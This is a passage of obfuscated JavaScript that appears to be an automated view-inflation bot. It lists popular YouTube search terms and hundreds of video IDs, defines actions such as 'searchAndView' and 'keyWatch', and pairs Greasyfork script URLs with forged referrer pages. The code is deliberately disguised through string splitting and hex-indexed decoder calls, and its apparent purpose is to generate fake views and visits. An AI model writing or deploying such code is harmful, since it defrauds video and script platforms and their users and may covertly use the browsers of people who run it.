'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + U(0xa, 'vn5h') + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x106e + 0x155d * -0x1 + -0xd * -0x2e9)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x955 + -0x16b * -0x17 + -0x29e8)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1cd3 + -0xad8 + 0x27ae);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    U(0x7, '0MmF') + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    V(0x2) + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    S(0x8) + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    S(0x14) + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    V(0x3) + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + S(0x4) + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': S(0x10) + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
